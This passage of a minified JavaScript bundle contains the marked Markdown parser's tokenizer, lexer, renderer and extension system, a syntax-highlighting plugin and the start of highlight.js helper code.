`,1)[0];let F;if(u=we,this.options.pedantic?(u=u.replace(this.rules.other.listReplaceNesting,"  "),F=u):F=u.replace(this.rules.other.tabCharGlobal,"    "),Y.test(u)||Q.test(u)||J.test(u)||K.test(u)||se.test(u))break;if(F.search(this.rules.other.nonSpaceChar)>=b||!u.trim())f+=`
`+F.slice(b);else{if(g||y.replace(this.rules.other.tabCharGlobal,"    ").search(this.rules.other.nonSpaceChar)>=4||Y.test(y)||Q.test(y)||se.test(y))break;f+=`
`+u}!g&&!u.trim()&&(g=!0),i+=we+`
`,t=t.substring(we.length+1),y=F.slice(b)}}r.loose||(o?r.loose=!0:this.rules.other.doubleBlankLine.test(i)&&(o=!0));let I=null,le;this.options.gfm&&(I=this.rules.other.listIsTask.exec(f),I&&(le=I[0]!=="[ ] ",f=f.replace(this.rules.other.listReplaceTask,""))),r.items.push({type:"list_item",raw:i,task:!!I,checked:le,loose:!1,text:f,tokens:[]}),r.raw+=i}const l=r.items.at(-1);if(l)l.raw=l.raw.trimEnd(),l.text=l.text.trimEnd();else return;r.raw=r.raw.trimEnd();for(let c=0;c<r.items.length;c++)if(this.lexer.state.top=!1,r.items[c].tokens=this.lexer.blockTokens(r.items[c].text,[]),!r.loose){const i=r.items[c].tokens.filter(y=>y.type==="space"),f=i.length>0&&i.some(y=>this.rules.other.anyLine.test(y.raw));r.loose=f}if(r.loose)for(let c=0;c<r.items.length;c++)r.items[c].loose=!0;return r}}html(t){const a=this.rules.block.html.exec(t);if(a)return{type:"html",block:!0,raw:a[0],pre:a[1]==="pre"||a[1]==="script"||a[1]==="style",text:a[0]}}def(t){const a=this.rules.block.def.exec(t);if(a){const n=a[1].toLowerCase().replace(this.rules.other.multipleSpaceGlobal," "),s=a[2]?a[2].replace(this.rules.other.hrefBrackets,"$1").replace(this.rules.inline.anyPunctuation,"$1"):"",r=a[3]?a[3].substring(1,a[3].length-1).replace(this.rules.inline.anyPunctuation,"$1"):a[3];return{type:"def",tag:n,raw:a[0],href:s,title:r}}}table(t){var o;const a=this.rules.block.table.exec(t);if(!a||!this.rules.other.tableDelimiter.test(a[2]))return;const n=en(a[1]),s=a[2].replace(this.rules.other.tableAlignChars,"").split("|"),r=(o=a[3])!=null&&o.trim()?a[3].replace(this.rules.other.tableRowBlankLine,"").split(`
`):[],p={type:"table",raw:a[0],header:[],align:[],rows:[]};if(n.length===s.length){for(const l of s)this.rules.other.tableAlignRight.test(l)?p.align.push("right"):this.rules.other.tableAlignCenter.test(l)?p.align.push("center"):this.rules.other.tableAlignLeft.test(l)?p.align.push("left"):p.align.push(null);for(let l=0;l<n.length;l++)p.header.push({text:n[l],tokens:this.lexer.inline(n[l]),header:!0,align:p.align[l]});for(const l of r)p.rows.push(en(l,p.header.length).map((c,i)=>({text:c,tokens:this.lexer.inline(c),header:!1,align:p.align[i]})));return p}}lheading(t){const a=this.rules.block.lheading.exec(t);if(a)return{type:"heading",raw:a[0],depth:a[2].charAt(0)==="="?1:2,text:a[1],tokens:this.lexer.inline(a[1])}}paragraph(t){const a=this.rules.block.paragraph.exec(t);if(a){const n=a[1].charAt(a[1].length-1)===`
`?a[1].slice(0,-1):a[1];return{type:"paragraph",raw:a[0],text:n,tokens:this.lexer.inline(n)}}}text(t){const a=this.rules.block.text.exec(t);if(a)return{type:"text",raw:a[0],text:a[0],tokens:this.lexer.inline(a[0])}}escape(t){const a=this.rules.inline.escape.exec(t);if(a)return{type:"escape",raw:a[0],text:a[1]}}tag(t){const a=this.rules.inline.tag.exec(t);if(a)return!this.lexer.state.inLink&&this.rules.other.startATag.test(a[0])?this.lexer.state.inLink=!0:this.lexer.state.inLink&&this.rules.other.endATag.test(a[0])&&(this.lexer.state.inLink=!1),!this.lexer.state.inRawBlock&&this.rules.other.startPreScriptTag.test(a[0])?this.lexer.state.inRawBlock=!0:this.lexer.state.inRawBlock&&this.rules.other.endPreScriptTag.test(a[0])&&(this.lexer.state.inRawBlock=!1),{type:"html",raw:a[0],inLink:this.lexer.state.inLink,inRawBlock:this.lexer.state.inRawBlock,block:!1,text:a[0]}}link(t){const a=this.rules.inline.link.exec(t);if(a){const n=a[2].trim();if(!this.options.pedantic&&this.rules.other.startAngleBracket.test(n)){if(!this.rules.other.endAngleBracket.test(n))return;const p=Ie(n.slice(0,-1),"\\");if((n.length-p.length)%2===0)return}else{const p=Rl(a[2],"()");if(p>-1){const l=(a[0].indexOf("!")===0?5:4)+a[1].length+p;a[2]=a[2].substring(0,p),a[0]=a[0].substring(0,l).trim(),a[3]=""}}let s=a[2],r="";if(this.options.pedantic){const p=this.rules.other.pedanticHrefTitle.exec(s);p&&(s=p[1],r=p[3])}else r=a[3]?a[3].slice(1,-1):"";return s=s.trim(),this.rules.other.startAngleBracket.test(s)&&(this.options.pedantic&&!this.rules.other.endAngleBracket.test(n)?s=s.slice(1):s=s.slice(1,-1)),tn(a,{href:s&&s.replace(this.rules.inline.anyPunctuation,"$1"),title:r&&r.replace(this.rules.inline.anyPunctuation,"$1")},a[0],this.lexer,this.rules)}}reflink(t,a){let n;if((n=this.rules.inline.reflink.exec(t))||(n=this.rules.inline.nolink.exec(t))){const s=(n[2]||n[1]).replace(this.rules.other.multipleSpaceGlobal," "),r=a[s.toLowerCase()];if(!r){const p=n[0].charAt(0);return{type:"text",raw:p,text:p}}return tn(n,r,n[0],this.lexer,this.rules)}}emStrong(t,a,n=""){let s=this.rules.inline.emStrongLDelim.exec(t);if(!s||s[3]&&n.match(this.rules.other.unicodeAlphaNumeric))return;if(!(s[1]||s[2]||"")||!n||this.rules.inline.punctuation.exec(n)){const p=[...s[0]].length-1;let o,l,c=p,i=0;const f=s[0][0]==="*"?this.rules.inline.emStrongRDelimAst:this.rules.inline.emStrongRDelimUnd;for(f.lastIndex=0,a=a.slice(-1*t.length+p);(s=f.exec(a))!=null;){if(o=s[1]||s[2]||s[3]||s[4]||s[5]||s[6],!o)continue;if(l=[...o].length,s[3]||s[4]){c+=l;continue}else if((s[5]||s[6])&&p%3&&!((p+l)%3)){i+=l;continue}if(c-=l,c>0)continue;l=Math.min(l,l+c+i);const y=[...s[0]][0].length,u=t.slice(0,p+s.index+y+l);if(Math.min(p,l)%2){const b=u.slice(1,-1);return{type:"em",raw:u,text:b,tokens:this.lexer.inlineTokens(b)}}const g=u.slice(2,-2);return{type:"strong",raw:u,text:g,tokens:this.lexer.inlineTokens(g)}}}}codespan(t){const a=this.rules.inline.code.exec(t);if(a){let n=a[2].replace(this.rules.other.newLineCharGlobal," ");const s=this.rules.other.nonSpaceChar.test(n),r=this.rules.other.startingSpaceChar.test(n)&&this.rules.other.endingSpaceChar.test(n);return s&&r&&(n=n.substring(1,n.length-1)),{type:"codespan",raw:a[0],text:n}}}br(t){const a=this.rules.inline.br.exec(t);if(a)return{type:"br",raw:a[0]}}del(t){const a=this.rules.inline.del.exec(t);if(a)return{type:"del",raw:a[0],text:a[2],tokens:this.lexer.inlineTokens(a[2])}}autolink(t){const a=this.rules.inline.autolink.exec(t);if(a){let n,s;return a[2]==="@"?(n=a[1],s="mailto:"+n):(n=a[1],s=n),{type:"link",raw:a[0],text:n,href:s,tokens:[{type:"text",raw:n,text:n}]}}}url(t){var n;let a;if(a=this.rules.inline.url.exec(t)){let s,r;if(a[2]==="@")s=a[0],r="mailto:"+s;else{let p;do p=a[0],a[0]=((n=this.rules.inline._backpedal.exec(a[0]))==null?void 0:n[0])??"";while(p!==a[0]);s=a[0],a[1]==="www."?r="http://"+a[0]:r=a[0]}return{type:"link",raw:a[0],text:s,href:r,tokens:[{type:"text",raw:s,text:s}]}}}inlineText(t){const a=this.rules.inline.text.exec(t);if(a){const n=this.lexer.state.inRawBlock;return{type:"text",raw:a[0],text:a[0],escaped:n}}}}class ae{constructor(t){L(this,"tokens");L(this,"options");L(this,"state");L(this,"tokenizer");L(this,"inlineQueue");this.tokens=[],this.tokens.links=Object.create(null),this.options=t||be,this.options.tokenizer=this.options.tokenizer||new ut,this.tokenizer=this.options.tokenizer,this.tokenizer.options=this.options,this.tokenizer.lexer=this,this.inlineQueue=[],this.state={inLink:!1,inRawBlock:!1,top:!0};const a={other:$,block:st.normal,inline:je.normal};this.options.pedantic?(a.block=st.pedantic,a.inline=je.pedantic):this.options.gfm&&(a.block=st.gfm,this.options.breaks?a.inline=je.breaks:a.inline=je.gfm),this.tokenizer.rules=a}static get rules(){return{block:st,inline:je}}static lex(t,a){return new ae(a).lex(t)}static lexInline(t,a){return new ae(a).inlineTokens(t)}lex(t){t=t.replace($.carriageReturn,`
`),this.blockTokens(t,this.tokens);for(let a=0;a<this.inlineQueue.length;a++){const n=this.inlineQueue[a];this.inlineTokens(n.src,n.tokens)}return this.inlineQueue=[],this.tokens}blockTokens(t,a=[],n=!1){var s,r,p;for(this.options.pedantic&&(t=t.replace($.tabCharGlobal,"    ").replace($.spaceLine,""));t;){let o;if((r=(s=this.options.extensions)==null?void 0:s.block)!=null&&r.some(c=>(o=c.call({lexer:this},t,a))?(t=t.substring(o.raw.length),a.push(o),!0):!1))continue;if(o=this.tokenizer.space(t)){t=t.substring(o.raw.length);const c=a.at(-1);o.raw.length===1&&c!==void 0?c.raw+=`
`:a.push(o);continue}if(o=this.tokenizer.code(t)){t=t.substring(o.raw.length);const c=a.at(-1);(c==null?void 0:c.type)==="paragraph"||(c==null?void 0:c.type)==="text"?(c.raw+=`
`+o.raw,c.text+=`
`+o.text,this.inlineQueue.at(-1).src=c.text):a.push(o);continue}if(o=this.tokenizer.fences(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.heading(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.hr(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.blockquote(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.list(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.html(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.def(t)){t=t.substring(o.raw.length);const c=a.at(-1);(c==null?void 0:c.type)==="paragraph"||(c==null?void 0:c.type)==="text"?(c.raw+=`
`+o.raw,c.text+=`
`+o.raw,this.inlineQueue.at(-1).src=c.text):this.tokens.links[o.tag]||(this.tokens.links[o.tag]={href:o.href,title:o.title});continue}if(o=this.tokenizer.table(t)){t=t.substring(o.raw.length),a.push(o);continue}if(o=this.tokenizer.lheading(t)){t=t.substring(o.raw.length),a.push(o);continue}let l=t;if((p=this.options.extensions)!=null&&p.startBlock){let c=1/0;const i=t.slice(1);let f;this.options.extensions.startBlock.forEach(y=>{f=y.call({lexer:this},i),typeof f=="number"&&f>=0&&(c=Math.min(c,f))}),c<1/0&&c>=0&&(l=t.substring(0,c+1))}if(this.state.top&&(o=this.tokenizer.paragraph(l))){const c=a.at(-1);n&&(c==null?void 0:c.type)==="paragraph"?(c.raw+=`
`+o.raw,c.text+=`
`+o.text,this.inlineQueue.pop(),this.inlineQueue.at(-1).src=c.text):a.push(o),n=l.length!==t.length,t=t.substring(o.raw.length);continue}if(o=this.tokenizer.text(t)){t=t.substring(o.raw.length);const c=a.at(-1);(c==null?void 0:c.type)==="text"?(c.raw+=`
`+o.raw,c.text+=`
`+o.text,this.inlineQueue.pop(),this.inlineQueue.at(-1).src=c.text):a.push(o);continue}if(t){const c="Infinite loop on byte: "+t.charCodeAt(0);if(this.options.silent){console.error(c);break}else throw new Error(c)}}return this.state.top=!0,a}inline(t,a=[]){return this.inlineQueue.push({src:t,tokens:a}),a}inlineTokens(t,a=[]){var o,l,c;let n=t,s=null;if(this.tokens.links){const i=Object.keys(this.tokens.links);if(i.length>0)for(;(s=this.tokenizer.rules.inline.reflinkSearch.exec(n))!=null;)i.includes(s[0].slice(s[0].lastIndexOf("[")+1,-1))&&(n=n.slice(0,s.index)+"["+"a".repeat(s[0].length-2)+"]"+n.slice(this.tokenizer.rules.inline.reflinkSearch.lastIndex))}for(;(s=this.tokenizer.rules.inline.blockSkip.exec(n))!=null;)n=n.slice(0,s.index)+"["+"a".repeat(s[0].length-2)+"]"+n.slice(this.tokenizer.rules.inline.blockSkip.lastIndex);for(;(s=this.tokenizer.rules.inline.anyPunctuation.exec(n))!=null;)n=n.slice(0,s.index)+"++"+n.slice(this.tokenizer.rules.inline.anyPunctuation.lastIndex);let r=!1,p="";for(;t;){r||(p=""),r=!1;let i;if((l=(o=this.options.extensions)==null?void 0:o.inline)!=null&&l.some(y=>(i=y.call({lexer:this},t,a))?(t=t.substring(i.raw.length),a.push(i),!0):!1))continue;if(i=this.tokenizer.escape(t)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.tag(t)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.link(t)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.reflink(t,this.tokens.links)){t=t.substring(i.raw.length);const y=a.at(-1);i.type==="text"&&(y==null?void 0:y.type)==="text"?(y.raw+=i.raw,y.text+=i.text):a.push(i);continue}if(i=this.tokenizer.emStrong(t,n,p)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.codespan(t)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.br(t)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.del(t)){t=t.substring(i.raw.length),a.push(i);continue}if(i=this.tokenizer.autolink(t)){t=t.substring(i.raw.length),a.push(i);continue}if(!this.state.inLink&&(i=this.tokenizer.url(t))){t=t.substring(i.raw.length),a.push(i);continue}let f=t;if((c=this.options.extensions)!=null&&c.startInline){let y=1/0;const u=t.slice(1);let g;this.options.extensions.startInline.forEach(b=>{g=b.call({lexer:this},u),typeof g=="number"&&g>=0&&(y=Math.min(y,g))}),y<1/0&&y>=0&&(f=t.substring(0,y+1))}if(i=this.tokenizer.inlineText(f)){t=t.substring(i.raw.length),i.raw.slice(-1)!=="_"&&(p=i.raw.slice(-1)),r=!0;const y=a.at(-1);(y==null?void 0:y.type)==="text"?(y.raw+=i.raw,y.text+=i.text):a.push(i);continue}if(t){const y="Infinite loop on byte: "+t.charCodeAt(0);if(this.options.silent){console.error(y);break}else throw new Error(y)}}return a}}class Wt{constructor(t){L(this,"options");L(this,"parser");this.options=t||be}space(t){return""}code({text:t,lang:a,escaped:n}){var p;const s=(p=(a||"").match($.notSpaceStart))==null?void 0:p[0],r=t.replace($.endingNewline,"")+`
`;return s?'<pre><code class="language-'+oe(s)+'">'+(n?r:oe(r,!0))+`</code></pre>
`:"<pre><code>"+(n?r:oe(r,!0))+`</code></pre>
`}blockquote({tokens:t}){return`<blockquote>
${this.parser.parse(t)}</blockquote>
`}html({text:t}){return t}heading({tokens:t,depth:a}){return`<h${a}>${this.parser.parseInline(t)}</h${a}>
`}hr(t){return`<hr>
`}list(t){const a=t.ordered,n=t.start;let s="";for(let o=0;o<t.items.length;o++){const l=t.items[o];s+=this.listitem(l)}const r=a?"ol":"ul",p=a&&n!==1?' start="'+n+'"':"";return"<"+r+p+`>
`+s+"</"+r+`>
`}listitem(t){var n;let a="";if(t.task){const s=this.checkbox({checked:!!t.checked});t.loose?((n=t.tokens[0])==null?void 0:n.type)==="paragraph"?(t.tokens[0].text=s+" "+t.tokens[0].text,t.tokens[0].tokens&&t.tokens[0].tokens.length>0&&t.tokens[0].tokens[0].type==="text"&&(t.tokens[0].tokens[0].text=s+" "+oe(t.tokens[0].tokens[0].text),t.tokens[0].tokens[0].escaped=!0)):t.tokens.unshift({type:"text",raw:s+" ",text:s+" ",escaped:!0}):a+=s+" "}return a+=this.parser.parse(t.tokens,!!t.loose),`<li>${a}</li>
`}checkbox({checked:t}){return"<input "+(t?'checked="" ':"")+'disabled="" type="checkbox">'}paragraph({tokens:t}){return`<p>${this.parser.parseInline(t)}</p>
`}table(t){let a="",n="";for(let r=0;r<t.header.length;r++)n+=this.tablecell(t.header[r]);a+=this.tablerow({text:n});let s="";for(let r=0;r<t.rows.length;r++){const p=t.rows[r];n="";for(let o=0;o<p.length;o++)n+=this.tablecell(p[o]);s+=this.tablerow({text:n})}return s&&(s=`<tbody>${s}</tbody>`),`<table>
<thead>
`+a+`</thead>
`+s+`</table>
`}tablerow({text:t}){return`<tr>
${t}</tr>
`}tablecell(t){const a=this.parser.parseInline(t.tokens),n=t.header?"th":"td";return(t.align?`<${n} align="${t.align}">`:`<${n}>`)+a+`</${n}>
`}strong({tokens:t}){return`<strong>${this.parser.parseInline(t)}</strong>`}em({tokens:t}){return`<em>${this.parser.parseInline(t)}</em>`}codespan({text:t}){return`<code>${oe(t,!0)}</code>`}br(t){return"<br>"}del({tokens:t}){return`<del>${this.parser.parseInline(t)}</del>`}link({href:t,title:a,tokens:n}){const s=this.parser.parseInline(n),r=Za(t);if(r===null)return s;t=r;let p='<a href="'+t+'"';return a&&(p+=' title="'+oe(a)+'"'),p+=">"+s+"</a>",p}image({href:t,title:a,text:n}){const s=Za(t);if(s===null)return oe(n);t=s;let r=`<img src="${t}" alt="${n}"`;return a&&(r+=` title="${oe(a)}"`),r+=">",r}text(t){return"tokens"in t&&t.tokens?this.parser.parseInline(t.tokens):"escaped"in t&&t.escaped?t.text:oe(t.text)}}class ma{strong({text:t}){return t}em({text:t}){return t}codespan({text:t}){return t}del({text:t}){return t}html({text:t}){return t}text({text:t}){return t}link({text:t}){return""+t}image({text:t}){return""+t}br(){return""}}class ne{constructor(t){L(this,"options");L(this,"renderer");L(this,"textRenderer");this.options=t||be,this.options.renderer=this.options.renderer||new Wt,this.renderer=this.options.renderer,this.renderer.options=this.options,this.renderer.parser=this,this.textRenderer=new ma}static parse(t,a){return new ne(a).parse(t)}static parseInline(t,a){return new ne(a).parseInline(t)}parse(t,a=!0){var s,r;let n="";for(let p=0;p<t.length;p++){const o=t[p];if((r=(s=this.options.extensions)==null?void 0:s.renderers)!=null&&r[o.type]){const c=o,i=this.options.extensions.renderers[c.type].call({parser:this},c);if(i!==!1||!["space","hr","heading","code","table","blockquote","list","html","paragraph","text"].includes(c.type)){n+=i||"";continue}}const l=o;switch(l.type){case"space":{n+=this.renderer.space(l);continue}case"hr":{n+=this.renderer.hr(l);continue}case"heading":{n+=this.renderer.heading(l);continue}case"code":{n+=this.renderer.code(l);continue}case"table":{n+=this.renderer.table(l);continue}case"blockquote":{n+=this.renderer.blockquote(l);continue}case"list":{n+=this.renderer.list(l);continue}case"html":{n+=this.renderer.html(l);continue}case"paragraph":{n+=this.renderer.paragraph(l);continue}case"text":{let c=l,i=this.renderer.text(c);for(;p+1<t.length&&t[p+1].type==="text";)c=t[++p],i+=`
`+this.renderer.text(c);a?n+=this.renderer.paragraph({type:"paragraph",raw:i,text:i,tokens:[{type:"text",raw:i,text:i,escaped:!0}]}):n+=i;continue}default:{const c='Token with "'+l.type+'" type was not found.';if(this.options.silent)return console.error(c),"";throw new Error(c)}}}return n}parseInline(t,a=this.renderer){var s,r;let n="";for(let p=0;p<t.length;p++){const o=t[p];if((r=(s=this.options.extensions)==null?void 0:s.renderers)!=null&&r[o.type]){const c=this.options.extensions.renderers[o.type].call({parser:this},o);if(c!==!1||!["escape","html","link","image","strong","em","codespan","br","del","text"].includes(o.type)){n+=c||"";continue}}const l=o;switch(l.type){case"escape":{n+=a.text(l);break}case"html":{n+=a.html(l);break}case"link":{n+=a.link(l);break}case"image":{n+=a.image(l);break}case"strong":{n+=a.strong(l);break}case"em":{n+=a.em(l);break}case"codespan":{n+=a.codespan(l);break}case"br":{n+=a.br(l);break}case"del":{n+=a.del(l);break}case"text":{n+=a.text(l);break}default:{const c='Token with "'+l.type+'" type was not found.';if(this.options.silent)return console.error(c),"";throw new Error(c)}}}return n}}class Je{constructor(t){L(this,"options");L(this,"block");this.options=t||be}preprocess(t){return t}postprocess(t){return t}processAllTokens(t){return t}provideLexer(){return this.block?ae.lex:ae.lexInline}provideParser(){return this.block?ne.parse:ne.parseInline}}L(Je,"passThroughHooks",new Set(["preprocess","postprocess","processAllTokens"]));class ds{constructor(...t){L(this,"defaults",wa());L(this,"options",this.setOptions);L(this,"parse",this.parseMarkdown(!0));L(this,"parseInline",this.parseMarkdown(!1));L(this,"Parser",ne);L(this,"Renderer",Wt);L(this,"TextRenderer",ma);L(this,"Lexer",ae);L(this,"Tokenizer",ut);L(this,"Hooks",Je);this.use(...t)}walkTokens(t,a){var s,r;let n=[];for(const p of t)switch(n=n.concat(a.call(this,p)),p.type){case"table":{const o=p;for(const l of o.header)n=n.concat(this.walkTokens(l.tokens,a));for(const l of o.rows)for(const c of l)n=n.concat(this.walkTokens(c.tokens,a));break}case"list":{const o=p;n=n.concat(this.walkTokens(o.items,a));break}default:{const o=p;(r=(s=this.defaults.extensions)==null?void 0:s.childTokens)!=null&&r[o.type]?this.defaults.extensions.childTokens[o.type].forEach(l=>{const c=o[l].flat(1/0);n=n.concat(this.walkTokens(c,a))}):o.tokens&&(n=n.concat(this.walkTokens(o.tokens,a)))}}return n}use(...t){const a=this.defaults.extensions||{renderers:{},childTokens:{}};return t.forEach(n=>{const s={...n};if(s.async=this.defaults.async||s.async||!1,n.extensions&&(n.extensions.forEach(r=>{if(!r.name)throw new Error("extension name required");if("renderer"in r){const p=a.renderers[r.name];p?a.renderers[r.name]=function(...o){let l=r.renderer.apply(this,o);return l===!1&&(l=p.apply(this,o)),l}:a.renderers[r.name]=r.renderer}if("tokenizer"in r){if(!r.level||r.level!=="block"&&r.level!=="inline")throw new Error("extension level must be 'block' or 'inline'");const p=a[r.level];p?p.unshift(r.tokenizer):a[r.level]=[r.tokenizer],r.start&&(r.level==="block"?a.startBlock?a.startBlock.push(r.start):a.startBlock=[r.start]:r.level==="inline"&&(a.startInline?a.startInline.push(r.start):a.startInline=[r.start]))}"childTokens"in r&&r.childTokens&&(a.childTokens[r.name]=r.childTokens)}),s.extensions=a),n.renderer){const r=this.defaults.renderer||new Wt(this.defaults);for(const p in n.renderer){if(!(p in r))throw new Error(`renderer '${p}' does not exist`);if(["options","parser"].includes(p))continue;const o=p,l=n.renderer[o],c=r[o];r[o]=(...i)=>{let f=l.apply(r,i);return f===!1&&(f=c.apply(r,i)),f||""}}s.renderer=r}if(n.tokenizer){const r=this.defaults.tokenizer||new ut(this.defaults);for(const p in n.tokenizer){if(!(p in r))throw new Error(`tokenizer '${p}' does not exist`);if(["options","rules","lexer"].includes(p))continue;const o=p,l=n.tokenizer[o],c=r[o];r[o]=(...i)=>{let f=l.apply(r,i);return f===!1&&(f=c.apply(r,i)),f}}s.tokenizer=r}if(n.hooks){const r=this.defaults.hooks||new Je;for(const p in n.hooks){if(!(p in r))throw new Error(`hook '${p}' does not exist`);if(["options","block"].includes(p))continue;const o=p,l=n.hooks[o],c=r[o];Je.passThroughHooks.has(p)?r[o]=i=>{if(this.defaults.async)return Promise.resolve(l.call(r,i)).then(y=>c.call(r,y));const f=l.call(r,i);return c.call(r,f)}:r[o]=(...i)=>{let f=l.apply(r,i);return f===!1&&(f=c.apply(r,i)),f}}s.hooks=r}if(n.walkTokens){const r=this.defaults.walkTokens,p=n.walkTokens;s.walkTokens=function(o){let l=[];return l.push(p.call(this,o)),r&&(l=l.concat(r.call(this,o))),l}}this.defaults={...this.defaults,...s}}),this}setOptions(t){return this.defaults={...this.defaults,...t},this}lexer(t,a){return ae.lex(t,a??this.defaults)}parser(t,a){return ne.parse(t,a??this.defaults)}parseMarkdown(t){return(n,s)=>{const r={...s},p={...this.defaults,...r},o=this.onError(!!p.silent,!!p.async);if(this.defaults.async===!0&&r.async===!1)return o(new Error("marked(): The async option was set to true by an extension. Remove async: false from the parse options object to return a Promise."));if(typeof n>"u"||n===null)return o(new Error("marked(): input parameter is undefined or null"));if(typeof n!="string")return o(new Error("marked(): input parameter is of type "+Object.prototype.toString.call(n)+", string expected"));p.hooks&&(p.hooks.options=p,p.hooks.block=t);const l=p.hooks?p.hooks.provideLexer():t?ae.lex:ae.lexInline,c=p.hooks?p.hooks.provideParser():t?ne.parse:ne.parseInline;if(p.async)return Promise.resolve(p.hooks?p.hooks.preprocess(n):n).then(i=>l(i,p)).then(i=>p.hooks?p.hooks.processAllTokens(i):i).then(i=>p.walkTokens?Promise.all(this.walkTokens(i,p.walkTokens)).then(()=>i):i).then(i=>c(i,p)).then(i=>p.hooks?p.hooks.postprocess(i):i).catch(o);try{p.hooks&&(n=p.hooks.preprocess(n));let i=l(n,p);p.hooks&&(i=p.hooks.processAllTokens(i)),p.walkTokens&&this.walkTokens(i,p.walkTokens);let f=c(i,p);return p.hooks&&(f=p.hooks.postprocess(f)),f}catch(i){return o(i)}}}onError(t,a){return n=>{if(n.message+=`
Please report this to https://github.com/markedjs/marked.`,t){const s="<p>An error occurred:</p><pre>"+oe(n.message+"",!0)+"</pre>";return a?Promise.resolve(s):s}if(a)return Promise.reject(n);throw n}}}const me=new ds;function E(e,t){return me.parse(e,t)}E.options=E.setOptions=function(e){return me.setOptions(e),E.defaults=me.defaults,Zn(E.defaults),E};E.getDefaults=wa;E.defaults=be;E.use=function(...e){return me.use(...e),E.defaults=me.defaults,Zn(E.defaults),E};E.walkTokens=function(e,t){return me.walkTokens(e,t)};E.parseInline=me.parseInline;E.Parser=ne;E.parser=ne.parse;E.Renderer=Wt;E.TextRenderer=ma;E.Lexer=ae;E.lexer=ae.lex;E.Tokenizer=ut;E.Hooks=Je;E.parse=E;E.options;E.setOptions;E.use;E.walkTokens;E.parseInline;ne.parse;ae.lex;function Ol(e){if(typeof e=="function"&&(e={highlight:e}),!e||typeof e.highlight!="function")throw new Error("Must provide highlight function");return typeof e.langPrefix!="string"&&(e.langPrefix="language-"),typeof e.emptyLangClass!="string"&&(e.emptyLangClass=""),{async:!!e.async,walkTokens(t){if(t.type!=="code")return;const a=an(t.lang);if(e.async)return Promise.resolve(e.highlight(t.text,a,t.lang||"")).then(nn(t));const n=e.highlight(t.text,a,t.lang||"");if(n instanceof Promise)throw new Error("markedHighlight is not set to async but the highlight function is async. Set the async option to true on markedHighlight to await the async highlight function.");nn(t)(n)},useNewRenderer:!0,renderer:{code(t,a,n){typeof t=="object"&&(n=t.escaped,a=t.lang,t=t.text);const s=an(a),r=s?e.langPrefix+rn(s):e.emptyLangClass,p=r?` class="${r}"`:"";return t=t.replace(/\n$/,""),`<pre><code${p}>${n?t:rn(t,!0)}
</code></pre>`}}}}function an(e){return(e||"").match(/\S*/)[0]}function nn(e){return t=>{typeof t=="string"&&t!==e.text&&(e.escaped=!0,e.text=t)}}const is=/[&<>"']/,_l=new RegExp(is.source,"g"),xs=/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,El=new RegExp(xs.source,"g"),Nl={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},sn=e=>Nl[e];function rn(e,t){if(t){if(is.test(e))return e.replace(_l,sn)}else if(xs.test(e))return e.replace(El,sn);return e}function ys(e){return e instanceof Map?e.clear=e.delete=e.set=function(){throw new Error("map is read-only")}:e instanceof Set&&(e.add=e.clear=e.delete=function(){throw new Error("set is read-only")}),Object.freeze(e),Object.getOwnPropertyNames(e).forEach(t=>{const a=e[t],n=typeof a;(n==="object"||n==="function")&&!Object.isFrozen(a)&&ys(a)}),e}class pn{constructor(t){t.data===void 0&&(t.data={}),this.data=t.data,this.isMatchIgnored=!1}ignoreMatch(){this.isMatchIgnored=!0}}function ws(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;")}function xe(e,...t){const a=Object.create(null);for(const n in e)a[n]=e[n];return t.forEach(function(n){for(const s in n)a[s]=n[s]}),a}const Ll="</span>",on=e=>!!e.scope,Al=(e,{prefix:t})=>{if(e.startsWith("language:"))return e.replace("language:","language-");if(e.includes(".")){const a=e.split(".");return[`${t}${a.shift()}`,...a.map((n,s)=>`${n}${"_".repeat(s+1)}`)].join(" ")}return`${t}${e}`};class Dl{constructor(t,a){this.buffer="",this.classPrefix=a.classPrefix,t.walk(this)}addText(t){this.buffer+=ws(t)}openNode(t){if(!on(t))return;const a=Al(t.scope,{prefix:this.classPrefix});this.span(a)}closeNode(t){on(t)&&(this.buffer+=Ll)}value(){return this.buffer}span(t){this.buffer+=`<span class="${t}">`}}const ln=(e={})=>{const t={children:[]};return Object.assign(t,e),t};class Sa{constructor(){this.rootNode=ln(),this.stack=[this.rootNode]}get top(){return this.stack[this.stack.length-1]}get root(){return this.rootNode}add(t){this.top.children.push(t)}openNode(t){const a=ln({scope:t});this.add(a),this.stack.push(a)}closeNode(){if(this.stack.length>1)return this.stack.pop()}closeAllNodes(){for(;this.closeNode(););}toJSON(){return JSON.stringify(this.rootNode,null,4)}walk(t){return this.constructor._walk(t,this.rootNode)}static _walk(t,a){return typeof a=="string"?t.addText(a):a.children&&(t.openNode(a),a.children.forEach(n=>this._walk(t,n)),t.closeNode(a)),t}static _collapse(t){typeof t!="string"&&t.children&&(t.children.every(a=>typeof a=="string")?t.children=[t.children.join("")]:t.children.forEach(a=>{Sa._collapse(a)}))}}class Hl extends Sa{constructor(t){super(),this.options=t}addText(t){t!==""&&this.add(t)}startScope(t){this.openNode(t)}endScope(){this.closeNode()}__addSublanguage(t,a){const n=t.root;a&&(n.scope=`language:${a}`),this.add(n)}toHTML(){return new Dl(this,this.options).value()}finalize(){return this.closeAllNodes(),!0}}function ze(e){return e?typeof e=="string"?e:e.source:null}function fs(e){return Te("(?=",e,")")}function jl(e){return Te("(?:",e,")*")}function Il(e){return Te("(?:",e,")?")}function Te(...e){return e.map(a=>ze(a)).join("")}function Vl(e){const t=e[e.length-1];return typeof t=="object"&&t.constructor===Object?(e.splice(e.length-1,1),t):{}}function 